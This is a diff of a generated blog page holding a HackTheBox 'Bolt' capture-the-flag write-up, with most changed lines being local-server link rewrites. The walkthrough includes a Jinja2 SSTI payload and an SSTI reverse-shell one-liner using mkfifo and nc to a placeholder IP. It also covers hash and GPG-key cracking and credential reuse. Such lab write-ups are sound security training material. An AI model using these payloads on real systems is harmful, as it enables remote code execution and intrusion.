@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
 
   <meta charset="utf-8" />
 
@@ -36,7 +36,7 @@
     <meta name="twitter:title" content="Bolt Hackthebox writeup">
     <meta name="twitter:description" content="In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost &amp;ldquo;demo&amp;rdquo; which has some functions aren&amp;rsquo;t in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password .
 ">
-    <meta name="twitter:image" content="/media/Bolt/start.png">
+    <meta name="twitter:image" content="//localhost:1313/media/Bolt/start.png">
   
 
   
@@ -44,8 +44,8 @@
   <meta property="og:title" content="Bolt Hackthebox writeup">
   <meta property="og:description" content="In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost &amp;ldquo;demo&amp;rdquo; which has some functions aren&amp;rsquo;t in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password .
 ">
-  <meta property="og:url" content="/post/bolt/">
-  <meta property="og:image" content="/media/Bolt/start.png">
+  <meta property="og:url" content="//localhost:1313/post/bolt/">
+  <meta property="og:image" content="//localhost:1313/media/Bolt/start.png">
 
 
 
@@ -53,7 +53,7 @@
 <meta name="generator" content="Hugo 0.86.1">
 
 
-<link rel="canonical" href="/post/bolt/">
+<link rel="canonical" href="//localhost:1313/post/bolt/">
 
 <meta name="renderer" content="webkit">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -78,20 +78,20 @@
 <meta name='msapplication-navbutton-color' content="#02b875">
 <meta name="msapplication-TileColor" content="#02b875">
 <meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
-<link rel="icon" href="/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
-<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
-<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
-<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="//localhost:1313/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="//localhost:1313/icons/icon-152x152.png">
+<link rel="manifest" href="//localhost:1313/manifest.json">
 
 
-<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+<link rel="preload" href="//localhost:1313/styles/main-rendered.min.css" as="style">
 
 
 <link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
-<link rel="preload" href="/images/avatar.gif" as="image">
-<link rel="preload" href="/images/test.jpg" as="image">
+<link rel="preload" href="//localhost:1313/images/avatar.gif" as="image">
+<link rel="preload" href="//localhost:1313/images/test.jpg" as="image">
 
 
 <style>
@@ -99,7 +99,7 @@
     background: rgb(244, 243, 241) url('/images/test.jpg') repeat fixed;
   }
 </style>
-<link rel="stylesheet" href="/styles/main-rendered.min.css">
+<link rel="stylesheet" href="//localhost:1313/styles/main-rendered.min.css">
 
 
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
@@ -139,9 +139,9 @@
     
     
   <header class="site-header">
-  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  <a href="//localhost:1313/"><img class="avatar" src="//localhost:1313/images/avatar.gif" alt="Avatar"></a>
   
-  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  <h2 class="title"><a href="//localhost:1313/">0xMesbaha</a></h2>
   
   <p class="subtitle"></p>
   <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
@@ -159,21 +159,21 @@
           
           
           ">
-          <a href="/">Posts</a>
+          <a href="//localhost:1313/">Posts</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="/tags/">Tags</a>
+          <a href="//localhost:1313/tags/">Tags</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="/about/">About</a>
+          <a href="//localhost:1313/about/">About</a>
         </li>
       
     </ul>
@@ -245,20 +245,20 @@ demo                    <span style="color:#f92672">[</span>Status: 302, Size: 2
 <ul>
 <li>visiting the web application at <code>bolt.htb</code> or <code>passbolt.bolt.htb</code> we are introduced with  :</li>
 </ul>
-<p><img src="/media/Bolt/20220224093240.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224093240.png" alt="error"></p>
 <ul>
 <li>there is a feedback form at the end but it doesn&rsquo;t work</li>
 <li>we can start viewing the pages at the application  :</li>
 </ul>
-<p><img src="/media/Bolt/20220224093405.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224093405.png" alt="error"></p>
 <ul>
 <li>at <code>/download</code> there is a file we can download so let&rsquo;s download it and see what it contains</li>
 </ul>
-<p><img src="/media/Bolt/20220224093429.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224093429.png" alt="error"></p>
 <ul>
 <li>extracting the <code>image.tar</code> we can see it contains :</li>
 </ul>
-<p><img src="/media/Bolt/20220224093713.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224093713.png" alt="error"></p>
 <ul>
 <li>each directory contains a <code>layer.tar </code> file , we can utilize some bash magic to extract them all :</li>
 </ul>
@@ -270,12 +270,12 @@ tar -xf  $file/layer.tar -C $file/
 </code></pre></div><ul>
 <li>now  we can use <code>tree</code> command to have an overview what does the files contains then we can start checking them manually</li>
 </ul>
-<p><img src="/media/Bolt/20220224100331.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224100331.png" alt="error"></p>
 <p>at <code>745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/</code> will find a <code>config.py</code> file</p>
 <ul>
 <li>reading it will find  :</li>
 </ul>
-<p><img src="/media/Bolt/20220224100409.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224100409.png" alt="error"></p>
 <ul>
 <li>and it loads  <code>db.sqlite3 </code>  we can start searching for it in all image layers maybe we find it and we did :</li>
 </ul>
@@ -285,73 +285,73 @@ find . -name db.sqlite3
 </code></pre></div><ul>
 <li>now we can open it and will find :</li>
 </ul>
-<p><img src="/media/Bolt/20220224100831.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224100831.png" alt="error"></p>
 <pre><code>admin@bolt.htb:$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
 </code></pre><p>we can try to crack this hash with JTR :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt admin@bolt.htb_hash
 <span style="color:#75715e"># password:deadbolt</span>
 </code></pre></div><p>great we have credentials we can try to login at the web application with it and we are in:</p>
-<p><img src="/media/Bolt/20220224101458.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224101458.png" alt="error"></p>
 <ul>
 <li>let&rsquo;s see where else we can utilize these valid credentials , we can visit <code>mail.bolt.htb </code> but it didn&rsquo;t work :( .</li>
 <li>we can also visit <code>demo.bolt.htb</code> and it also doesn&rsquo;t work however it contains a registration function :</li>
 <li>it needs a ticket to create an account</li>
 </ul>
-<p><img src="/media/Bolt/20220224102126.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224102126.png" alt="error"></p>
 <ul>
 <li>navigating through img files will see at <code>41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/</code> some source codes we can check <code>routes.py</code> and we will see :</li>
 </ul>
-<p><img src="/media/Bolt/20220224103501.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224103501.png" alt="error"></p>
 <ul>
 <li>seems like invitation code we can try to register at <code>demo.bolt.htb</code> with it .</li>
 <li>we create account successfully and can login with it :</li>
 </ul>
-<p><img src="/media/Bolt/20220224103833.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224103833.png" alt="error"></p>
 <ul>
 <li>we can also login to <code>mail.bolt.htb </code> with our new credentials , they seem to be connected somehow</li>
 </ul>
-<p><img src="/media/Bolt/20220224103947.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224103947.png" alt="error"></p>
 <h2 id="enumeration-harder">Enumeration Harder</h2>
 <ul>
 <li>now as we are logged in in all the web applications we should have notice that <code>demo.bolt.htb</code> and <code>bolt.htb</code>  are pretty much the same however in the <code>demo</code> there are more features and pages we can access .</li>
 <li>we now are searching for any input at any page to test it</li>
 <li>at demo and under profile page we have this setting tab which has input option :</li>
 </ul>
-<p><img src="/media/Bolt/20220224104439.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224104439.png" alt="error"></p>
 <ul>
 <li>we can test it</li>
 </ul>
-<p><img src="/media/Bolt/20220224104528.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224104528.png" alt="error"></p>
 <ul>
 <li>and instantly at <code>mail.bolt.htb</code> an email has received</li>
 </ul>
-<p><img src="/media/Bolt/20220224104619.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224104619.png" alt="error"></p>
 <ul>
 <li>and when we pressed the link another mail has received :</li>
 </ul>
-<p><img src="/media/Bolt/20220224104701.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224104701.png" alt="error"></p>
 <ul>
 <li>so now we have understood how the web applications function together we can test these input fields for potential vulnerabilities .</li>
 <li>we have seen in the source codes &ldquo;flask&rdquo; a lot so we can test <a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">SSTI</a> .</li>
 </ul>
 <h2 id="exploitation-">exploitation :</h2>
 <p>testing SSTI can began with a basic test like :</p>
-<p><img src="/media/Bolt/20220224105201.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224105201.png" alt="error"></p>
 <ul>
 <li>we now will receive first mail to confirm and 2nd one with the response :</li>
 </ul>
-<p><img src="/media/Bolt/20220224105326.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224105326.png" alt="error"></p>
 <ul>
 <li>Nice we have a valid SSTI exploit at the name field , we can try to leverage it to RCE  with payload like <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">those</a></li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span> self._TemplateReference__context.cycler.__init__.__globals__.os.popen<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;whoami&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
 </code></pre></div><p>response :</p>
-<p><img src="/media/Bolt/20220224105554.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224105554.png" alt="error"></p>
 <p>so now we can get a reverse shell with :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span> self._TemplateReference__context.cycler.__init__.__globals__.os.popen<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;ip&gt; 9999 &gt;/tmp/f&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
 </code></pre></div><h2 id="foothold-">Foothold :</h2>
 <p>and we have our shell as www-data  :</p>
-<p><img src="/media/Bolt/20220224105825.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224105825.png" alt="error"></p>
 <ul>
 <li>
 <p>if we look around we will find a lot of files to explore , we can use <strong>Linpeas</strong> to guide us where to look first and non expected files in some directories and if there is a path to escalate our privilege .</p>
@@ -360,7 +360,7 @@ find . -name db.sqlite3
 <p>we can check  <code>roundcube/config/config.inc.php</code> and will find :</p>
 </li>
 </ul>
-<p><img src="/media/Bolt/20220224120011.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224120011.png" alt="error"></p>
 <p>which is a potential password we can use latter</p>
 <ul>
 <li>also there is <code>/etc/passbolt</code> we can check it</li>
@@ -368,7 +368,7 @@ find . -name db.sqlite3
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep --color<span style="color:#f92672">=</span>auto -rnw <span style="color:#e6db74">&#39;.&#39;</span> -Rie <span style="color:#e6db74">&#34;password&#34;</span> --color<span style="color:#f92672">=</span>always 2&gt;/dev/null
 <span style="color:#75715e"># ./passbolt.php:42:            &#39;password&#39; =&gt; &#39;rT2;jW7&lt;eY8!dX8}pQ8%&#39;,</span>
-</code></pre></div><p><img src="/media/Bolt/20220224114429.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/Bolt/20220224114429.png" alt="error"></p>
 <p>we can try to see if we can access the mysql database :</p>
 <pre><code>passbolt:rT2;jW7&lt;eY8!dX8}pQ8%
 </code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bolt:/etc/passbolt$ mysql -u passbolt -D passboltdb -p
@@ -383,31 +383,31 @@ mysql &gt; Describe secrets ; <span style="color:#75715e"># found table secrets 
 </code></pre></div><ul>
 <li>will find this PGP message inside the column data of table secrets :</li>
 </ul>
-<p><img src="/media/Bolt/20220224115251.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224115251.png" alt="error"></p>
 <ul>
 <li>so far we didn&rsquo;t find a potential factor to escalate to <code>eddie</code> or <code>clarck</code></li>
 <li>however we have collected some passwords we can test them as ssh credentials with any user .</li>
 </ul>
 <h2 id="eddie-user-">Eddie user :</h2>
-<p><img src="/media/Bolt/20220224120424.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224120424.png" alt="error"></p>
 <ul>
 <li>now we can ssh to the eddie user :</li>
 </ul>
-<p><img src="/media/Bolt/20220224120528.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224120528.png" alt="error"></p>
 <ul>
 <li>Back to our linpeas output we had  :</li>
 </ul>
-<p><img src="/media/Bolt/20220224121919.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224121919.png" alt="error"></p>
 <ul>
 <li>and he had one mail from clark contains :</li>
 </ul>
-<p><img src="/media/Bolt/20220224122018.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224122018.png" alt="error"></p>
 <pre><code>Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it
 </code></pre><ul>
 <li>so we should search for this browser to see what is this mail about</li>
 <li>we can find google-chrome is the browser mentioned</li>
 </ul>
-<p><img src="/media/Bolt/20220224122359.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224122359.png" alt="error"></p>
 <ul>
 <li>now we want to get eddie private key to be able to read the message we have seen before in the MySQL DB .</li>
 <li>we can start searching for it inside the chrome folder we just hit .</li>
@@ -416,37 +416,37 @@ mysql &gt; Describe secrets ; <span style="color:#75715e"># found table secrets 
 </code></pre></div><p>will find some results just have the header and not the key itself  , but will find :</p>
 <pre><code>Binary file ./Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
 </code></pre><p>seems promising , now to grep in a binary you should use  &ldquo;-a&rdquo; which means all even binaries .</p>
-<p><img src="/media/Bolt/20220224123711.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224123711.png" alt="error"></p>
 <p>and here it is now you can copy it then replace &ldquo;\r\n&rdquo; with new line and you now have the private key</p>
-<p><img src="/media/Bolt/20220224123755.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224123755.png" alt="error"></p>
 <h3 id="decrypting-the-message">Decrypting the message</h3>
 <p>now to decrypt  a PGP encrypted message we will use :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gpg --import eddie_private
 $ gpg -d message.inc
 </code></pre></div><p>but it asks for a passphrase to import the gpg key</p>
-<p><img src="/media/Bolt/20220224124020.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224124020.png" alt="error"></p>
 <ul>
 <li>we can utilize <strong>gpg2john</strong> to get the hash then <strong>john</strong>  to crack it</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gpg2john eddie_private &gt; eddie_key_hash
 $ john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt eddie_key_hash
-</code></pre></div><p><img src="/media/Bolt/20220224124928.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/Bolt/20220224124928.png" alt="error"></p>
 <ul>
 <li>now we can decrypt the message :</li>
 </ul>
-<p><img src="/media/Bolt/20220224125124.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Bolt/20220224125124.png" alt="error"></p>
 <h2 id="root-access">Root Access</h2>
 <p>using the password we just found in the message : <code>Z(2rmxsNW(Z?3=p/9s</code>  we get the root access
-<img src="/media/Bolt/20220224125233.png" alt="error"></p></article>
+<img src="//localhost:1313/media/Bolt/20220224125233.png" alt="error"></p></article>
     <footer class="post-footer">
       
       <ul class="post-tags">
         
-          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+          <li><a href="//localhost:1313/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
         
-          <li><a href="/tags/ssti"><span class="tag">SSTI</span></a></li>
+          <li><a href="//localhost:1313/tags/ssti"><span class="tag">SSTI</span></a></li>
         
-          <li><a href="/tags/pgp-decrypting"><span class="tag">PGP Decrypting</span></a></li>
+          <li><a href="//localhost:1313/tags/pgp-decrypting"><span class="tag">PGP Decrypting</span></a></li>
         
       </ul>
       
@@ -500,7 +500,7 @@ $ john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyo
 
 
 
-<script src="/scripts/index.min.js"></script>
+<script src="//localhost:1313/scripts/index.min.js"></script>
 
 <script>
   if ('serviceWorker' in navigator) {
